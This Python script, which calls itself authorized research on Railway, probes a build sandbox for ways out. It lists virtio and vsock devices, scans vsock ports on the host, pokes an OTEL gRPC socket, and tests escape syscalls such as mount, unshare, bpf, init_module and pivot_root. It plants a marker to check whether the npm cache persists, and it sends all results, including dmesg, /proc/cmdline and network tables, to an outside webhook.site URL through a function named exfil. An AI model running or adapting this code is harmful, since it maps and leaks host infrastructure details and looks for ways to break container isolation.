#!/usr/bin/env python3
"""Lane C battery 3: vsock/virtio, OTEL socket, syscall map, cache marker. Authorized Railway research."""
import socket, struct, subprocess, time, os, sys, json, urllib.request, ctypes

TOKEN = "31fc19a8-5cfc-44ac-b27f-517fdcb8ffbb"
W = "https://webhook.site/" + TOKEN
CAP = 60000

def exfil(label, data):
    data = str(data)[:CAP]
    try:
        req = urllib.request.Request(W, data=("###%s### %s" % (label, data)).encode(),
                                     headers={"Content-Type": "text/plain"})
        urllib.request.urlopen(req, timeout=25)
    except Exception as e:
        sys.stderr.write("exfil fail %s: %s\n" % (label, e))

def run(cmd):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return "ERR %s" % e

# ---------- E0: virtio + vsock ----------
e0 = []
e0.append("=== /sys/bus/virtio/devices ===\n" + run("ls -la /sys/bus/virtio/devices/ 2>&1"))
e0.append("=== virtio details ===\n" + run("for d in /sys/bus/virtio/devices/*; do echo \"-- $d\"; for f in device vendor status modalias; do echo \"  $f=$(cat $d/$f 2>/dev/null)\"; done; ls $d 2>/dev/null | tr '\\n' ' '; echo; done 2>&1"))
e0.append("=== /proc/devices ===\n" + run("cat /proc/devices 2>&1"))
e0.append("=== /dev vsock/vport ===\n" + run("ls -la /dev/vsock /dev/vport* /dev/vhost* 2>&1"))
e0.append("=== modules ===\n" + run("cat /proc/modules 2>&1 | head -40; ls /sys/module/ 2>/dev/null | tr '\\n' ' ' | head -c 4000"))
e0.append("=== /proc/net/vsock ===\n" + run("cat /proc/net/vsock 2>&1 | head -20"))
e0.append("=== /proc/cmdline ===\n" + run("cat /proc/cmdline 2>&1"))
e0.append("=== dmesg ===\n" + run("dmesg 2>&1 | head -c 8000"))
e0.append("=== /proc/iomem ===\n" + run("cat /proc/iomem 2>&1 | head -40"))
e0.append("=== /etc/hosts ===\n" + run("cat /etc/hosts 2>&1"))
e0.append("=== mountinfo npm line ===\n" + run("grep -E 'npm|otel' /proc/self/mountinfo 2>&1"))
exfil("E0-virtio", "\n".join(e0))

# ---------- E1: vsock connect probe ----------
def vsock_probe():
    AF_VSOCK = 40
    res = {}
    ports = [22, 53, 80, 443, 1024, 2375, 2376, 3000, 4000, 5000, 50051, 6443, 8000, 8080, 8081, 8443, 9000, 9090, 10250, 15432]
    for cid in (2, 1):
        for p in ports:
            try:
                s = socket.socket(AF_VSOCK, socket.SOCK_STREAM)
                s.settimeout(0.8)
                r = s.connect_ex((cid, p))
                s.close()
                if r == 0:
                    res["%d:%d" % (cid, p)] = "OPEN"
            except Exception as e:
                res["%d:%d" % (cid, p)] = "EXC %s" % e
                break
    return res

try:
    vr = vsock_probe()
except Exception as e:
    vr = {"__error__": str(e)}
exfil("E1-vsock", json.dumps(vr, indent=1))

# ---------- E2: OTEL socket gRPC/HTTP probe ----------
def otel_probe():
    out = []
    path = "/dev/otel-grpc.sock"
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(path)
        out.append("connect: OK")
        # HTTP/2 client preface + empty SETTINGS
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = struct.pack("!I", 0) + b"\x04\x00\x00\x00\x00"  # len=0 type=4(SETTINGS) flags=0 stream=0
        s.sendall(preface + settings)
        time.sleep(1.0)
        try:
            data = s.recv(4096)
            out.append("h2 resp len=%d hex=%s" % (len(data), data[:200].hex()))
        except socket.timeout:
            out.append("h2 resp: timeout")
        s.close()
    except Exception as e:
        out.append("h2 probe: %s" % e)
    # HTTP/1.1 probe on a fresh connection
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(path)
        s.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n")
        time.sleep(0.5)
        try:
            data = s.recv(2048)
            out.append("h1 resp len=%d: %s" % (len(data), data[:300]))
        except socket.timeout:
            out.append("h1 resp: timeout")
        s.close()
    except Exception as e:
        out.append("h1 probe: %s" % e)
    return "\n".join(out)

exfil("E2-otel", otel_probe())

# ---------- E3: syscall map (seccomp profile) ----------
libc = ctypes.CDLL("libc.so.6", use_errno=True)
def sc(name, fn):
    ctypes.set_errno(0)
    try:
        r = fn()
        return "%s rc=%s errno=%s" % (name, r, ctypes.get_errno())
    except Exception as e:
        return "%s EXC %s" % (name, e)

res = []
# mount(NULL, NULL, NULL, 0, NULL)
res.append(sc("mount", lambda: libc.mount(None, None, None, 0, None)))
# unshare(CLONE_NEWNS=0x20000)
res.append(sc("unshare(CLONE_NEWNS)", lambda: libc.unshare(0x20000)))
# unshare(CLONE_NEWUSER=0x10000000)
res.append(sc("unshare(CLONE_NEWUSER)", lambda: libc.unshare(0x10000000)))
# setns(-1, 0)
res.append(sc("setns", lambda: libc.setns(-1, 0)))
# open_by_handle_at(AT_FDCWD, NULL, 0)
res.append(sc("open_by_handle_at", lambda: libc.syscall(304, -100, None, 0)))
# bpf(0, NULL, 0)
res.append(sc("bpf", lambda: libc.syscall(321, 0, None, 0)))
# perf_event_open
res.append(sc("perf_event_open", lambda: libc.syscall(298, None, 0, -1, -1, 0)))
# ptrace(PTRACE_TRACEME=0, 0, 0)
res.append(sc("ptrace", lambda: libc.ptrace(0, 0, None, None)))
# init_module
res.append(sc("init_module", lambda: libc.syscall(175, None, 0, None)))
# kexec_load
res.append(sc("kexec_load", lambda: libc.syscall(246, 0, 0, None, 0)))
# keyctl(0, ...)
res.append(sc("add_key", lambda: libc.syscall(248, b"user", b"k", b"v", 1, -2)))
# io_uring_setup
res.append(sc("io_uring_setup", lambda: libc.syscall(425, 1, None)))
# userfaultfd
res.append(sc("userfaultfd", lambda: libc.syscall(323, 0)))
# process_vm_readv(1, ...) 
class IOV(ctypes.Structure):
    _fields_ = [("base", ctypes.c_void_p), ("len", ctypes.c_size_t)]
res.append(sc("process_vm_readv", lambda: libc.syscall(310, 1, None, 0, None, 0, 0)))
# clone3
res.append(sc("clone3", lambda: libc.syscall(435, None, 0)))
# move_mount
res.append(sc("move_mount", lambda: libc.syscall(429, -100, None, -100, None, 0)))
# fsopen
res.append(sc("fsopen", lambda: libc.syscall(430, b"proc", 0)))
# open_tree
res.append(sc("open_tree", lambda: libc.syscall(428, -100, b"/", 0)))
# pivot_root
res.append(sc("pivot_root", lambda: libc.syscall(155, b"/tmp", b"/tmp")))
exfil("E3-syscalls", "\n".join(res))

# ---------- E4: cache marker + npm cache after 2 builds ----------
marker = "/root/.npm/LANEC-MARKER-b3"
try:
    open(marker, "w").write("laneC marker %s" % time.time())
    mres = "marker written: " + run("ls -la /root/.npm/ 2>&1")
except Exception as e:
    mres = "marker write fail: %s" % e
exfil("E4-cachemarker", mres + "\n=== full /root/.npm ===\n" + run("find /root/.npm -maxdepth 3 2>&1 | head -40"))

# ---------- E5: network extras ----------
e5 = []
e5.append("=== /proc/net/fib_trie LOCAL ===\n" + run("grep -A3 'Local:' /proc/net/fib_trie | head -30"))
e5.append("=== arp ===\n" + run("cat /proc/net/arp"))
e5.append("=== netstat -rn via /proc ===\n" + run("cat /proc/net/route"))
e5.append("=== tcp conns now ===\n" + run("cat /proc/net/tcp | head -20"))
e5.append("=== igmp/udp ===\n" + run("cat /proc/net/udp | head -10"))
e5.append("=== sysctl net ===\n" + run("for f in ip_forward rp_filter; do echo $f=$(cat /proc/sys/net/ipv4/$f 2>/dev/null); done; cat /proc/sys/net/ipv4/conf/eth1/* 2>/dev/null | head -5"))
exfil("E5-netextra", "\n".join(e5))

print("battery3 done")
